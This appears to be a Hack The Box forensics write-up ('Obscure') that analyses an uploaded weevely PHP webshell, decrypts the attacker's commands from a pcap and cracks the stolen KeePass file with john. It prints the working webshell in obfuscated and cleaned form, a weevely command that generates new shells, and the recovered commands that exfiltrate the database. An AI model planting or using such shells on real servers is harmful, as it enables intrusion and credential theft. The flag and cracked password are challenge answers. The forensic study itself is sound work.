# Forensics

## Description

An attacker has found a vulnerability in our web server that allows arbitrary PHP file upload in our Apache server. Suchlike, the hacker has uploaded a what seems to be like an obfuscated shell (`support.php`). We monitor our network 24/7 and generate logs from tcpdump (we provided the log file for the period of two minutes before we terminated the HTTP service for investigation), however, we need your help in analyzing and identifying commands the attacker wrote to understand what was compromised.
## Solution

```bash
└─$ unzip -l Obscure.zip
Archive:  Obscure.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   524711  2019-05-21 16:56   19-05-21_22532255.pcap
      749  2019-05-20 16:19   support.php
      502  2019-05-21 19:15   to-do.txt
---------                     -------
   525962                     3 files

└─$ unzip -P hackthebox Obscure.zip 
```

First let's take a look at the webshell:
```php
└─$ cat support.php
<?php
$V='$k="80eu)u)32263";$khu)=u)"6f8af44u)abea0";$kf=u)"35103u)u)9f4a7b5";$pu)="0UlYu)yJHG87Eu)JqEz6u)"u)u);function u)x($';
$P='++)u){$o.=u)$t{u)$i}^$k{$j};}}u)retuu)rn $o;}u)if(u)@pregu)_u)match("/$kh(.u)+)$kf/",@u)u)file_u)getu)_cu)ontents(';
$d='u)t,$k){u)$c=strlu)en($k);$l=strlenu)($t)u);u)$o=""u);for($i=0u);u)$i<$l;){for(u)$j=0;(u)$u)j<$c&&$i<$l)u)u);$j++,$i';
$B='ob_get_cou)ntu)ents();@obu)_end_cleu)anu)();$r=@basu)e64_eu)ncu)ode(@x(@gzu)compress(u)$o),u)$k));pru)u)int(u)"$p$kh$r$kf");}';
$N=str_replace('FD','','FDcreFDateFD_fFDuncFDFDtion');
$c='"php://u)input"),$u)m)==1){@u)obu)_start();u)@evau)l(@gzuu)ncu)ompress(@x(@bau)se64_u)decodu)e($u)m[1]),$k))u));$u)ou)=@';
$u=str_replace('u)','',$V.$d.$P.$c.$B);
$x=$N('',$u);$x();
?>
```

If you ever used **[weevely3](https://github.com/epinna/weevely3)** it should look very familiar!

To test it we can generate a payload:
```bash
└─$ weevely generate password agent.php
Generated 'agent.php' with password 'password' of 771 byte size.

└─$ cat agent.php
<?php
$u='lean();$r=2z@base62z2z4_enc2zode(@x(@g2zzcompress(2z$o2z),$k)2z2z);print("2z$p$kh$r$kf");}';
$T='@x(@2zbase2z64_decode2z($m[1]2z2z),$k)));$o=@2zob_ge2zt_conte2znts2z();@ob2z_end_2zc';
$S='ztents("php:2z//inpu2zt"),$2zm)==1) {@ob_star2zt();@e2zval(@g2zzunco2zmpress(2z';
$c='l2zaybZ8X";functio2zn x($2zt,$k){2z$c=st2zrlen2z($k)2z2z;$l=2zst2zrl2zen($t);$2z';
$V='$2zk="5f4dc2zc3b";$kh="5a2za765d2z2z61d2z83";$kf="27de2zb882c2zf99"2z;$p="r2zEBWqE6p2zU';
$J='$i}^$k{$j2z2z};2z}}return $o;}2zif (@2zpreg_match(2z"2z/$2zkh(.+)$k2zf/",@file_2zget_c2z2zon2';
$i=str_replace('MI','','cMIreaMIMIteMI_funMIctMIion');
$o='o="";for($i=0;$i<$l2z;){for($j=0;2z($j<2z$c&&$2zi<$l);$2zj++,2z$i++){$o.=$2zt2z{';
$X=str_replace('2z','',$V.$c.$o.$J.$S.$T.$u);
$z=$i('',$X);$z();
?>
```

Anyway, back the the `support.php`, we can remove the last line which is calling the function and just echo `$u`

```php
<?php
$k = "80e32263";
$kh = "6f8af44abea0";
$kf = "351039f4a7b5";
$p = "0UlYyJHG87EJqEz6";
function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l; ) {
        for ($j = 0; $j < $c && $i < $l; $j++, $i++) {
            $o .= $t[$i] ^ $k[$j];
        }
    }
    return $o;
}
if (@preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m) == 1) {
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($m[1]), $k)));
    $o = @ob_get_contents();
    @ob_end_clean();
    $r = @base64_encode(@x(@gzcompress($o), $k));
    print "$p$kh$r$kf";
}
?>
```

[Weevely Backdoor Analysis / Blue Team DFIR](https://artikrh.sh/posts/weevely-backdoor-analysis.html)

Get the data:
```bash
└─$ tshark -r 19-05-21_22532255.pcap -Y '_ws.col.info contains "support.php"' -T fields -e http.file_data | xxd -r -p > sent.txt
└─$ while read -r index; do tshark -r 19-05-21_22532255.pcap -Y "tcp.stream eq $index" -T fields -e http.file_data | xxd -r -p >> received.txt ; done < <(tshark -r 19-05-21_22532255.pcap -Y '_ws.col.info contains "support.php"' -T fields -e tcp.stream)
```

Modify the script to our needs:
```php
<?php
$k = "80e32263";
$kh = "6f8af44abea0";
$kf = "351039f4a7b5";

function decrypt($data,$k,$kh,$kf){
    $data = peel($data,$kh,$kf);
    $first = base64_decode($data);
    $second = x($first,$k);
    $third = gzuncompress($second);
    return $third;
}

function peel($data,$kh,$kf){
    if (@preg_match("/$kh(.+)$kf/", $data, $m) == 1) {
        return $m[1];
    } else {
		return null;
	}
}

function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l;) {
        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
            $o.=$t[$i]^$k[$j];
        }
    }
    return $o;
}

$file = './sent.txt';  
$handle = fopen($file, "r");

echo "Commands sent: " . PHP_EOL;
while (($line = fgets($handle)) !== false) {
    try { echo decrypt($line, $k, $kh, $kf) . PHP_EOL; } catch (Exception $e) { ; }
}

fclose($handle);

echo '- - - - - - - - - - - - - - - - -' . PHP_EOL;

$file = './received.txt';
$handle = fopen($file, "r");

echo "Commands output: " . PHP_EOL;
while (($line = fgets($handle)) !== false) {
    try { echo decrypt($line, $k, $kh, $kf) . PHP_EOL; } catch (Exception $e) { ; }
}

fclose($handle);
?>
```

```bash
└─$ php dec.php
Commands sent:
chdir('/var/www/html/uploads');@error_reporting(0);@system('id 2>&1');
chdir('/var/www/html/uploads');@error_reporting(0);@system('ls -lah /home/* 2>&1');
chdir('/var/www/html/uploads');@error_reporting(0);@chdir('/home/developer')&&print(@getcwd());
chdir('/home/developer');@error_reporting(0);@system('base64 -w 0 pwdb.kdbx 2>&1');
PHP Warning:  gzuncompress(): data error in /media/sf_VBoxShare/dec.php on line 10

- - - - - - - - - - - - - - - - -
Commands output:
chdir('/var/www/html/uploads');@error_reporting(0);@system('id 2>&1');
uid=33(www-data) gid=33(www-data) groups=33(www-data)

total 24K
drwxr-xr-x 2 developer developer 4.0K May 21 20:37 .
drwxr-xr-x 3 root      root      4.0K May 20 21:28 ..
-rw-r--r-- 1 developer developer  220 May 20 21:28 .bash_logout
-rw-r--r-- 1 developer developer 3.5K May 20 21:28 .bashrc
-rw-r--r-- 1 developer developer  675 May 20 21:28 .profile
-rw-r--r-- 1 developer developer 1.6K May 21 20:37 pwdb.kdbx

/home/developer
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
```

No password in sight, so we might have to crack it?...
```bash
└─$ keepass2john pwdb.kdbx > pwdb.hash
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=.\rockyou.txt .\hashes
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
Use the "--format=KeePass-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chainsaw         (pwdb)
1g 0:00:00:15 DONE (2024-09-26 15:18) 0.06323g/s 1357p/s 1357c/s 1357C/s chivas13..alexis13
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

![obscure.png](/assets/ctf/htb/forensics/obscure.png)

> Flag: `HTB{pr0tect_y0_shellZ}`